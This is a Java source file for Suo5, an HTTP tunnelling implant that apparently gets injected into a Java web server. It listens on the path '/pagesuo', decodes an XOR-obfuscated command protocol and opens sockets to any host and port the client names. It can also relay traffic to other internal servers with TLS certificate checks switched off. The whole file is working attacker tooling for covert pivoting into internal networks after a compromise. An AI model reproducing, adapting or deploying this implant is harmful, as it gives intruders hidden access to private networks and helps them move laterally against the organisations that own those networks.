package com.sf.sl;

import com.sf.redefine.MyRequest;
import com.sf.redefine.MyResponse;

import javax.net.ssl.*;
import java.io.*;
import java.net.*;
import java.nio.ByteBuffer;
import java.security.cert.CertificateException;
import java.security.cert.X509Certificate;
import java.util.Date;
import java.util.Enumeration;
import java.util.HashMap;

public class Suo5 implements Runnable, HostnameVerifier, X509TrustManager {
    static HashMap addrs = collectAddr();
    private static final String pathPattern = "/pagesuo";

    InputStream gInStream;
    OutputStream gOutStream;

    public Suo5() {
    }

    public Suo5(InputStream in, OutputStream out) {
        this.gInStream = in;
        this.gOutStream = out;
    }


    public static void doService(Object obj, String url, String method, java.io.InputStream in) {
        if (url.matches(pathPattern)) {
            java.util.Map objMap = (java.util.Map) obj;
            Object request = objMap.get("request");
            Object response = objMap.get("response");
            try {
                process(request,response,in);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    public static void process(Object request, Object response, java.io.InputStream in) {
        String agent = null;
        String contentType = null;
        try {
            agent = MyRequest.getHeader(request,"User-Agent");
            contentType = MyRequest.getHeader(request,"Content-Type");
        } catch (Exception e) {
            e.printStackTrace();
        }

//        if (agent == null || !agent.equals("Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.1.2.3")) {
//            return;
//        }
//        if (contentType == null) {
//            return;
//        }

        try {
            System.out.println(contentType);
            if (contentType.equals("application/plain")) {
                tryFullDuplex(request, response,in);
                return;
            }
            processDataUnary(request, response,in);
//            if (contentType.equals("application/x-binary")) {
//                processDataBio(request, response,in);
//            } else {
//                processDataUnary(request, response,in);
//            }
        } catch (Throwable e) {
//                System.out.printf("process data error %s\n", e);
//                e.printStackTrace();
        }
    }

    public static void readInputStreamWithTimeout(InputStream is, byte[] b, int timeoutMillis) throws IOException, InterruptedException {
        int bufferOffset = 0;
        long maxTimeMillis = new Date().getTime() + timeoutMillis;
        while (new Date().getTime() < maxTimeMillis && bufferOffset < b.length) {
            int readLength = b.length - bufferOffset;
            if (is.available() < readLength) {
                readLength = is.available();
            }
            // can alternatively use bufferedReader, guarded by isReady():
            int readResult = is.read(b, bufferOffset, readLength);
            if (readResult == -1) break;
            bufferOffset += readResult;
            Thread.sleep(200);
        }
    }

    public static void tryFullDuplex(Object request, Object response,java.io.InputStream in) throws IOException, InterruptedException {
        byte[] data = new byte[32];
        readInputStreamWithTimeout(in, data, 2000);
        try {
            OutputStream out = (OutputStream) MyResponse.getOutputStream(response);
            out.write(data);
            out.flush();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }


    private HashMap newCreate(byte s) {
        HashMap m = new HashMap();
        m.put("ac", new byte[]{0x04});
        m.put("s", new byte[]{s});
        return m;
    }

    private static HashMap newData(byte[] data) {
        HashMap m = new HashMap();
        m.put("ac", new byte[]{0x01});
        m.put("dt", data);
        return m;
    }

    private static HashMap newDel() {
        HashMap m = new HashMap();
        m.put("ac", new byte[]{0x02});
        return m;
    }

    private static HashMap newStatus(byte b) {
        HashMap m = new HashMap();
        m.put("s", new byte[]{b});
        return m;
    }

    static byte[] u32toBytes(int i) {
        byte[] result = new byte[4];
        result[0] = (byte) (i >> 24);
        result[1] = (byte) (i >> 16);
        result[2] = (byte) (i >> 8);
        result[3] = (byte) (i /*>> 0*/);
        return result;
    }

    static int bytesToU32(byte[] bytes) {
        return ((bytes[0] & 0xFF) << 24) |
                ((bytes[1] & 0xFF) << 16) |
                ((bytes[2] & 0xFF) << 8) |
                ((bytes[3] & 0xFF) << 0);
    }

    static byte[] copyOfRange(byte[] original, int from, int to) {
        int newLength = to - from;
        if (newLength < 0) {
            throw new IllegalArgumentException(from + " > " + to);
        }
        byte[] copy = new byte[newLength];
        int copyLength = Math.min(original.length - from, newLength);
        // can't use System.arraycopy of Arrays.copyOf, there is no system in some environment
        // System.arraycopy(original, from, copy, 0,  copyLength);
        for (int i = 0; i < copyLength; i++) {
            copy[i] = original[from + i];
        }
        return copy;
    }


    private static byte[] marshal(HashMap m) throws IOException {
        ByteArrayOutputStream buf = new ByteArrayOutputStream();
        Object[] keys = m.keySet().toArray();
        for (int i = 0; i < keys.length; i++) {
            String key = (String) keys[i];
            byte[] value = (byte[]) m.get(key);
            buf.write((byte) key.length());
            buf.write(key.getBytes());
            buf.write(u32toBytes(value.length));
            buf.write(value);
        }

        byte[] data = buf.toByteArray();
        ByteBuffer dbuf = ByteBuffer.allocate(5 + data.length);
        dbuf.putInt(data.length);
        // xor key
        byte key = data[data.length / 2];
        dbuf.put(key);
        for (int i = 0; i < data.length; i++) {
            data[i] = (byte) (data[i] ^ key);
        }
        dbuf.put(data);
        return dbuf.array();
    }

    private static HashMap unmarshal(InputStream in) throws Exception {
        DataInputStream reader = new DataInputStream(in);
        byte[] header = new byte[4 + 1]; // size and datatype
        reader.readFully(header);
        // read full
        ByteBuffer bb = ByteBuffer.wrap(header);
        int len = bb.getInt();
        int x = bb.get();
        if (len > 1024 * 1024 * 32) {
            throw new IOException("invalid len");
        }
        byte[] bs = new byte[len];
        reader.readFully(bs);
        for (int i = 0; i < bs.length; i++) {
            bs[i] = (byte) (bs[i] ^ x);
        }
        HashMap m = new HashMap();
        byte[] buf;
        for (int i = 0; i < bs.length - 1; ) {
            short kLen = bs[i];
            i += 1;
            if (i + kLen >= bs.length) {
                throw new Exception("key len error");
            }
            if (kLen < 0) {
                throw new Exception("key len error");
            }
            buf = copyOfRange(bs, i, i + kLen);
            String key = new String(buf);
            i += kLen;

            if (i + 4 >= bs.length) {
                throw new Exception("value len error");
            }
            buf = copyOfRange(bs, i, i + 4);
            int vLen = bytesToU32(buf);
            i += 4;
            if (vLen < 0) {
                throw new Exception("value error");
            }

            if (i + vLen > bs.length) {
                throw new Exception("value error");
            }
            byte[] value = copyOfRange(bs, i, i + vLen);
            i += vLen;

            m.put(key, value);
        }
        return m;
    }

    private static void processDataBio(Object request, Object resp, java.io.InputStream reqInputStream) throws Exception {
        final BufferedInputStream reqReader = new BufferedInputStream(reqInputStream);
        HashMap dataMap;
        dataMap = unmarshal(reqReader);

        byte[] action = (byte[]) dataMap.get("ac");
        if (action.length != 1 || action[0] != 0x00) {
            MyResponse.setStatus(resp,403);
            return;
        }
        MyResponse.setBufferSize(resp,8 * 1024);

        final OutputStream respOutStream = (OutputStream) MyResponse.getOutputStream(resp);

        // 0x00 create socket
        MyResponse.setHeader(resp,"X-Accel-Buffering", "no");

        String host = new String((byte[]) dataMap.get("h"));
        int port = Integer.parseInt(new String((byte[]) dataMap.get("p")));
        Socket sc;
        try {
            sc = new Socket();
            sc.connect(new InetSocketAddress(host, port), 5000);
        } catch (Exception e) {
            respOutStream.write(marshal(newStatus((byte) 0x01)));
            respOutStream.flush();
            respOutStream.close();
            return;
        }

        respOutStream.write(marshal(newStatus((byte) 0x00)));
        respOutStream.flush();

        final OutputStream scOutStream = sc.getOutputStream();
        final InputStream scInStream = sc.getInputStream();

        Thread t = null;
        try {
            Suo5 p = new Suo5(scInStream, respOutStream);
            t = new Thread((Runnable) p);
            t.start();
            readReq(reqReader, scOutStream);
        } catch (Exception e) {
//                System.out.printf("pipe error, %s\n", e);
        } finally {
            sc.close();
            respOutStream.close();
            if (t != null) {
                t.join();
            }
        }
    }

    private static void readSocket(InputStream inputStream, OutputStream outputStream, boolean needMarshal) throws IOException {
        byte[] readBuf = new byte[1024 * 8];

        while (true) {
            int n = inputStream.read(readBuf);
            if (n <= 0) {
                break;
            }
            byte[] dataTmp = copyOfRange(readBuf, 0, 0 + n);
            if (needMarshal) {
                dataTmp = marshal(newData(dataTmp));
            }
            outputStream.write(dataTmp);
            outputStream.flush();
        }
    }

    private static void readReq(BufferedInputStream bufInputStream, OutputStream socketOutStream) throws Exception {
        while (true) {
            HashMap dataMap;
            dataMap = unmarshal(bufInputStream);

            byte[] action = (byte[]) dataMap.get("ac");
            if (action.length != 1) {
                return;
            }
            if (action[0] == 0x02) {
                socketOutStream.close();
                return;
            } else if (action[0] == 0x01) {
                byte[] data = (byte[]) dataMap.get("dt");
                if (data.length != 0) {
                    socketOutStream.write(data);
                    socketOutStream.flush();
                }
            } else if (action[0] == 0x03) {
                continue;
            } else {
                return;
            }
        }
    }

    private static void processDataUnary(Object request, Object resp,java.io.InputStream is) throws Exception {
        Object ctx = MyRequest.getServletContext(request);
        BufferedInputStream reader = new BufferedInputStream(is);
        HashMap dataMap;
        dataMap = unmarshal(reader);
        System.out.println(dataMap);
        String clientId = new String((byte[]) dataMap.get("id"));
        byte[] action = (byte[]) dataMap.get("ac");
        if (action.length != 1) {
            MyResponse.setStatus(resp,403);
            return;
        }

            /*
                ActionCreate    byte = 0x00
                ActionData      byte = 0x01
                ActionDelete    byte = 0x02
                ActionHeartbeat byte = 0x03
             */
        byte[] redirectData = (byte[]) dataMap.get("r");
        boolean needRedirect = redirectData != null && redirectData.length > 0;
        String redirectUrl = "";
        if (needRedirect) {
            dataMap.remove("r");
            redirectUrl = new String(redirectData);
            needRedirect = !isLocalAddr(redirectUrl);
        }
        // load balance, send request with data to request url
        // action 0x00 need to pipe, see below
        if (needRedirect && action[0] >= 0x01 && action[0] <= 0x03) {
            HttpURLConnection conn = redirect(request, dataMap, redirectUrl);
            conn.disconnect();
            return;
        }

        MyResponse.setBufferSize(resp,8 * 1024);
        OutputStream respOutStream = (OutputStream) MyResponse.getOutputStream(resp);
        if (action[0] == 0x02) {
            java.lang.reflect.Method getAttribute = MyRequest.getServletContext(request).getClass().getDeclaredMethod("getAttribute", String.class);
            Object obj = getAttribute.invoke(MyRequest.getServletContext(request), clientId);
            OutputStream scOutStream = (OutputStream) obj;
            if (scOutStream != null) {
                scOutStream.close();
            }
            return;
        } else if (action[0] == 0x01) {
            java.lang.reflect.Method getAttribute = MyRequest.getServletContext(request).getClass().getDeclaredMethod("getAttribute", String.class);
            Object obj = getAttribute.invoke(MyRequest.getServletContext(request), clientId);
            OutputStream scOutStream = (OutputStream) obj;
            if (scOutStream == null) {
                respOutStream.write(marshal(newDel()));
                respOutStream.flush();
                respOutStream.close();
                return;
            }
            byte[] data = (byte[]) dataMap.get("dt");
            if (data.length != 0) {
                scOutStream.write(data);
                scOutStream.flush();
            }
            respOutStream.close();
            return;
        } else {
        }

        if (action[0] != 0x00) {
            return;
        }
        // 0x00 create new tunnel
        MyResponse.setHeader(resp,"X-Accel-Buffering", "no");

        String host = new String((byte[]) dataMap.get("h"));
        int port = Integer.parseInt(new String((byte[]) dataMap.get("p")));

        InputStream readFrom;
        Socket sc = null;
        HttpURLConnection conn = null;

        if (needRedirect) {
            // pipe redirect stream and current response body
            conn = redirect(request, dataMap, redirectUrl);
            readFrom = conn.getInputStream();
        } else {
            // pipe socket stream and current response body
            try {
                sc = new Socket();
                sc.connect(new InetSocketAddress(host, port), 5000);
                readFrom = sc.getInputStream();

                java.lang.reflect.Method getAttribute = MyRequest.getServletContext(request).getClass().getDeclaredMethod("setAttribute", String.class,Object.class);
                getAttribute.invoke(MyRequest.getServletContext(request), clientId,sc.getOutputStream());

                respOutStream.write(marshal(newStatus((byte) 0x00)));
                respOutStream.flush();
            } catch (Exception e) {
                java.lang.reflect.Method getAttribute = MyRequest.getServletContext(request).getClass().getDeclaredMethod("removeAttribute", String.class);
                getAttribute.invoke(MyRequest.getServletContext(request), clientId);
                respOutStream.write(marshal(newStatus((byte) 0x01)));
                respOutStream.flush();
                respOutStream.close();
                return;
            }
        }

        try {
            readSocket(readFrom, respOutStream, !needRedirect);
        } catch (Exception e) {
//                System.out.printf("pipe error, %s\n", e);
//                e.printStackTrace();
        } finally {
            if (sc != null) {
                sc.close();
            }
            if (conn != null) {
                conn.disconnect();
            }
            respOutStream.close();
            java.lang.reflect.Method getAttribute = MyRequest.getServletContext(request).getClass().getDeclaredMethod("removeAttribute", String.class);
            getAttribute.invoke(MyRequest.getServletContext(request), clientId);
        }
    }

    public void run() {
        try {
            readSocket(gInStream, gOutStream, true);
        } catch (Exception e) {
//                System.out.printf("read socket error, %s\n", e);
//                e.printStackTrace();
        }
    }

    static HashMap collectAddr() {
        HashMap addrs = new HashMap();
        try {
            Enumeration nifs = NetworkInterface.getNetworkInterfaces();
            while (nifs.hasMoreElements()) {
                NetworkInterface nif = (NetworkInterface) nifs.nextElement();
                Enumeration addresses = nif.getInetAddresses();
                while (addresses.hasMoreElements()) {
                    InetAddress addr = (InetAddress) addresses.nextElement();
                    String s = addr.getHostAddress();
                    if (s != null) {
                        // fe80:0:0:0:fb0d:5776:2d7c:da24%wlan4  strip %wlan4
                        int ifaceIndex = s.indexOf('%');
                        if (ifaceIndex != -1) {
                            s = s.substring(0, ifaceIndex);
                        }
                        addrs.put((Object) s, (Object) Boolean.TRUE);
                    }
                }
            }
        } catch (Exception e) {
//                System.out.printf("read socket error, %s\n", e);
//                e.printStackTrace();
        }
        return addrs;
    }

    static boolean isLocalAddr(String url) throws Exception {
        String ip = (new URL(url)).getHost();
        return addrs.containsKey(ip);
    }

    static HttpURLConnection redirect(Object request, HashMap dataMap, String rUrl) throws Exception {
        String method = MyRequest.getMethod(request);
        URL u = new URL(rUrl);
        HttpURLConnection conn = (HttpURLConnection) u.openConnection();
        conn.setRequestMethod(method);
        try {
            // conn.setConnectTimeout(3000);
            conn.getClass().getMethod("setConnectTimeout", new Class[]{int.class}).invoke(conn, new Object[]{new Integer(3000)});
            // conn.setReadTimeout(0);
            conn.getClass().getMethod("setReadTimeout", new Class[]{int.class}).invoke(conn, new Object[]{new Integer(0)});
        } catch (Exception e) {
            // java1.4
        }
        conn.setDoOutput(true);
        conn.setDoInput(true);

        // ignore ssl verify
        // ref: https://github.com/L-codes/Neo-reGeorg/blob/master/templates/NeoreGeorg.java
        if (HttpsURLConnection.class.isInstance(conn)) {
            ((HttpsURLConnection) conn).setHostnameVerifier(new Suo5());
            SSLContext ctx = SSLContext.getInstance("SSL");
            ctx.init(null, new TrustManager[]{new Suo5()}, null);
            ((HttpsURLConnection) conn).setSSLSocketFactory(ctx.getSocketFactory());
        }

        Enumeration headers = (Enumeration) MyRequest.getHeaderNames(request);
        while (headers.hasMoreElements()) {
            String k = (String) headers.nextElement();
            conn.setRequestProperty(k, MyRequest.getHeader(request,k));
        }

        OutputStream rout = conn.getOutputStream();
        rout.write(marshal(dataMap));
        rout.flush();
        rout.close();
        conn.getResponseCode();
        return conn;
    }

    public boolean verify(String hostname, SSLSession session) {
        return true;
    }

    public void checkClientTrusted(X509Certificate[] chain, String authType) throws CertificateException {
    }

    public void checkServerTrusted(X509Certificate[] chain, String authType) throws CertificateException {
    }

    public X509Certificate[] getAcceptedIssuers() {
        return new X509Certificate[0];
    }
}
